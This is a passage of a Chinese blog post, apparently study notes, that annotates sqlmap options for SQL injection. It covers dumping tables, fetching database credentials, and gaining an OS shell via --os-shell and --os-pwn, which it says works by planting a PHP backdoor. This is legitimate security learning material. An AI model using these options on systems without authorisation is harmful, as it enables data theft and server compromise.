+<h4 id="–safe-url-SAFEURL"><a href="#–safe-url-SAFEURL" class="headerlink" title="–safe-url=SAFEURL"></a>–safe-url=SAFEURL</h4><pre class="line-numbers language-none"><code class="language-none">有些Web应用程序会在你多次错误访问的请求后，会屏蔽你所有的请求，这里提供一个安全不错误的连接，每隔一段时间请求<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–safe-post-SAFEP"><a href="#–safe-post-SAFEP" class="headerlink" title="–safe-post=SAFEP"></a>–safe-post=SAFEP</h4><pre class="line-numbers language-none"><code class="language-none">设置一个正确的POST数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–safe-freq-SAFER"><a href="#–safe-freq-SAFER" class="headerlink" title="–safe=freq=SAFER"></a>–safe=freq=SAFER</h4><pre class="line-numbers language-none"><code class="language-none">设置访问安全url时间的时间间隔.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–safe-req-SAFER"><a href="#–safe-req-SAFER" class="headerlink" title="–safe-req=SAFER"></a>–safe-req=SAFER</h4><pre class="line-numbers language-none"><code class="language-none">从文件中读取安全,或者说正确http请求。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–skip-urlencode"><a href="#–skip-urlencode" class="headerlink" title="–skip-urlencode"></a>–skip-urlencode</h4><pre class="line-numbers language-none"><code class="language-none">不进行url编码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="force-ssl"><a href="#force-ssl" class="headerlink" title="force-ssl"></a>force-ssl</h4><pre class="line-numbers language-none"><code class="language-none">强迫使用SSL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–hpp"><a href="#–hpp" class="headerlink" title="–hpp"></a>–hpp</h4><pre class="line-numbers language-none"><code class="language-none">参数污染 ?id&#x3D;cmd&amp;id&#x3D;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="eval-EVAL"><a href="#eval-EVAL" class="headerlink" title="-eval=EVAL"></a>-eval=EVAL</h4><pre class="line-numbers language-none"><code class="language-none">执行一些代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="SQLMAP优化注入"><a href="#SQLMAP优化注入" class="headerlink" title="SQLMAP优化注入"></a>SQLMAP优化注入</h3><h4 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h4><pre class="line-numbers language-none"><code class="language-none">开启所有优化<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–keep-alive"><a href="#–keep-alive" class="headerlink" title="–keep-alive"></a>–keep-alive</h4><pre class="line-numbers language-none"><code class="language-none">与--proxy不兼容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–null-connection"><a href="#–null-connection" class="headerlink" title="–null-connection"></a>–null-connection</h4><pre class="line-numbers language-none"><code class="language-none">直接获得回复的body的大小，而不用获得内容。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–tread"><a href="#–tread" class="headerlink" title="–tread"></a>–tread</h4><pre class="line-numbers language-none"><code class="language-none">多线程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><h4 id="p-TESTPARAMETER"><a href="#p-TESTPARAMETER" class="headerlink" title="-p TESTPARAMETER"></a>-p TESTPARAMETER</h4><pre class="line-numbers language-none"><code class="language-none">设定测试的参数。
+sqlmap默认测试所有的GET与POST参数，当--level的值大于等于2时也会测试HTTP的cookie值，大于等于三时也会测试USER-Agent和HTTP的Referer头<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="–skip-SKIP"><a href="#–skip-SKIP" class="headerlink" title="–skip=SKIP"></a>–skip=SKIP</h4><pre class="line-numbers language-none"><code class="language-none">跳过一些参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–skip-static"><a href="#–skip-static" class="headerlink" title="–skip-static"></a>–skip-static</h4><pre class="line-numbers language-none"><code class="language-none">跳过一些静态的数据类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–dbms-DBMS"><a href="#–dbms-DBMS" class="headerlink" title="–dbms=DBMS"></a>–dbms=DBMS</h4><pre class="line-numbers language-none"><code class="language-none">指定数据库类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–os-OS"><a href="#–os-OS" class="headerlink" title="–os=OS"></a>–os=OS</h4><pre class="line-numbers language-none"><code class="language-none">指定一些操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–dbms-cred-DBMS"><a href="#–dbms-cred-DBMS" class="headerlink" title="–dbms-cred=DBMS"></a>–dbms-cred=DBMS</h4><pre class="line-numbers language-none"><code class="language-none">获得数据库认证信息(user:password)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–invalid-bignum"><a href="#–invalid-bignum" class="headerlink" title="–invalid-bignum"></a>–invalid-bignum</h4><pre class="line-numbers language-none"><code class="language-none">注入参数形式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–no-escape"><a href="#–no-escape" class="headerlink" title="–no-escape"></a>–no-escape</h4><pre class="line-numbers language-none"><code class="language-none">将字符串变为char(ascii)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–prefix-–suffix"><a href="#–prefix-–suffix" class="headerlink" title="–prefix, –suffix"></a>–prefix, –suffix</h4><pre class="line-numbers language-none"><code class="language-none">选择参数&#39;,&#39;)之类的闭合方式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="tamper"><a href="#tamper" class="headerlink" title="-tamper"></a>-tamper</h4><h3 id="探测注入"><a href="#探测注入" class="headerlink" title="探测注入"></a>探测注入</h3><h4 id="–level-LEVEL"><a href="#–level-LEVEL" class="headerlink" title="–level=LEVEL"></a>–level=LEVEL</h4><pre class="line-numbers language-none"><code class="language-none">探测的级别<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–risk-RISK"><a href="#–risk-RISK" class="headerlink" title="–risk=RISK"></a>–risk=RISK</h4><pre class="line-numbers language-none"><code class="language-none">探测的级别<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–string-STRINg"><a href="#–string-STRINg" class="headerlink" title="–string=STRINg"></a>–string=STRINg</h4><pre class="line-numbers language-none"><code class="language-none">设置返回页面中的字符，页面返回这个字符，说明我们的注入判断语句是正确的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–not-string-STRINg"><a href="#–not-string-STRINg" class="headerlink" title="–not-string=STRINg"></a>–not-string=STRINg</h4><pre class="line-numbers language-none"><code class="language-none">设置返回页面中的字符，页面没有返回这个字符，说明我们的注入判断语句是错误的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–regexp-REGEXP"><a href="#–regexp-REGEXP" class="headerlink" title="–regexp=REGEXP"></a>–regexp=REGEXP</h4><pre class="line-numbers language-none"><code class="language-none">用正则告诉sqlmap返回什么是正确的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–code-CODE"><a href="#–code-CODE" class="headerlink" title="–code=CODE"></a>–code=CODE</h4><pre class="line-numbers language-none"><code class="language-none">用http响应码来判断注入语句是正确的,列如相应200时为真,相应401时为加。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–text-only"><a href="#–text-only" class="headerlink" title="–text-only"></a>–text-only</h4><pre class="line-numbers language-none"><code class="language-none">判断返回页面是否相同<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–titles"><a href="#–titles" class="headerlink" title="–titles"></a>–titles</h4><pre class="line-numbers language-none"><code class="language-none">真条件下的返回页面的标题与假条件下返回页面呃标题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h3><h4 id="–time-sec-TIMESEC"><a href="#–time-sec-TIMESEC" class="headerlink" title="–time-sec=TIMESEC"></a>–time-sec=TIMESEC</h4><pre class="line-numbers language-none"><code class="language-none">基于时间盲注时,设置数据库延迟(默认5s)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h4 id="–union-clos-UCOLS"><a href="#–union-clos-UCOLS" class="headerlink" title="–union-clos=UCOLS"></a>–union-clos=UCOLS</h4><pre class="line-numbers language-none"><code class="language-none">设置联合查询列的数目的范围 10-20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–union-char"><a href="#–union-char" class="headerlink" title="–union-char="></a>–union-char=</h4><pre class="line-numbers language-none"><code class="language-none">设置union查询使用的字符,默认为NULL
+
+Union select NULL,NULL,name from....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="–union-from"><a href="#–union-from" class="headerlink" title="–union-from"></a>–union-from</h4><pre class="line-numbers language-none"><code class="language-none">设置union查询的库<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–dns-domain"><a href="#–dns-domain" class="headerlink" title="–dns-domain"></a>–dns-domain</h4><pre class="line-numbers language-none"><code class="language-none">DNS攻击<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–second-order"><a href="#–second-order" class="headerlink" title="–second-order"></a>–second-order</h4><pre class="line-numbers language-none"><code class="language-none">二次注入<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="f-–fingerprint"><a href="#f-–fingerprint" class="headerlink" title="-f ,–fingerprint"></a>-f ,–fingerprint</h4><pre class="line-numbers language-none"><code class="language-none">指纹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="枚举注入"><a href="#枚举注入" class="headerlink" title="枚举注入"></a>枚举注入</h3><p>首先获得数据库的各种信息已经在上面说过了，这里不再赘述。</p>
+<h4 id="–dump"><a href="#–dump" class="headerlink" title="–dump"></a>–dump</h4><pre class="line-numbers language-none"><code class="language-none">可以用来获得指定数据库,表,列的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–start-–stop"><a href="#–start-–stop" class="headerlink" title="–start, –stop"></a>–start, –stop</h4><pre class="line-numbers language-none"><code class="language-none">指定从第几行输出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="x"><a href="#x" class="headerlink" title="-x"></a>-x</h4><pre class="line-numbers language-none"><code class="language-none">指定不枚举列<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–first-–last"><a href="#–first-–last" class="headerlink" title="–first,–last"></a>–first,–last</h4><pre class="line-numbers language-none"><code class="language-none">用在盲注，指定想看的字符。例如：
+
+--first&#x3D;1 --last&#x3D;3 获得前三个字符。
+
+pass 变为 pas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="–sql-query-””"><a href="#–sql-query-””" class="headerlink" title="–sql-query=””"></a>–sql-query=””</h4><pre class="line-numbers language-none"><code class="language-none">指定一个sql语句执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h4><pre class="line-numbers language-none"><code class="language-none">在运行过程中选择sql语句执行。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="sql-file"><a href="#sql-file" class="headerlink" title="-sql-file"></a>-sql-file</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><h4 id="–common-tables-columns"><a href="#–common-tables-columns" class="headerlink" title="–common-tables(columns)"></a>–common-tables(columns)</h4><pre class="line-numbers language-none"><code class="language-none">使用爆破来获得表与列。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="shell攻击"><a href="#shell攻击" class="headerlink" title="shell攻击"></a>shell攻击</h3><h4 id="–os-cmd"><a href="#–os-cmd" class="headerlink" title="–os-cmd="></a>–os-cmd=</h4><pre class="line-numbers language-none"><code class="language-none">执行shell命令
+
+原理：创造一个php文件里面包含后门代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h4><pre class="line-numbers language-none"><code class="language-none">执行后,可以再选择shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–os-pwn"><a href="#–os-pwn" class="headerlink" title="–os-pwn"></a>–os-pwn</h4><pre class="line-numbers language-none"><code class="language-none">获得权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–msf-path-”指定目录”"><a href="#–msf-path-”指定目录”" class="headerlink" title="–msf-path=”指定目录”"></a>–msf-path=”指定目录”</h4><pre class="line-numbers language-none"><code class="language-none">指定文件创造的目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="SQLSever"><a href="#SQLSever" class="headerlink" title="SQLSever"></a>SQLSever</h2><p>  1.语法与MySQL不同<br>    1. select * from student;(相同)<br>    2. 没有show databases;</p>
+<h2 id="Oracle语法"><a href="#Oracle语法" class="headerlink" title="Oracle语法"></a>Oracle语法</h2><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h2 id="拦截方式"><a href="#拦截方式" class="headerlink" title="拦截方式"></a>拦截方式</h2>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Violet</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/09/03/sql-injection/">http://example.com/2021/09/03/sql-injection/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Violet</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
+                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Web安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/09/03/hexo-markdown-yu-fa/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Hexo Markdown 语法">
+                        
+                        <span class="card-title">Hexo Markdown 语法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Hexo语法尝试与总结，本文章仅限于matery主题
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-03
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%80%BB%E7%BB%93/" class="post-category">
+                                    总结
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/08/30/article-title/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="article title">
+                        
+                        <span class="card-title">article title</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Violet
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="2227373273"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+			<span id="sitetime"></span>
+
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">author Violet</a>
+           
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">52.9k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:88888888" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 888888" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2021, 8, 30, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
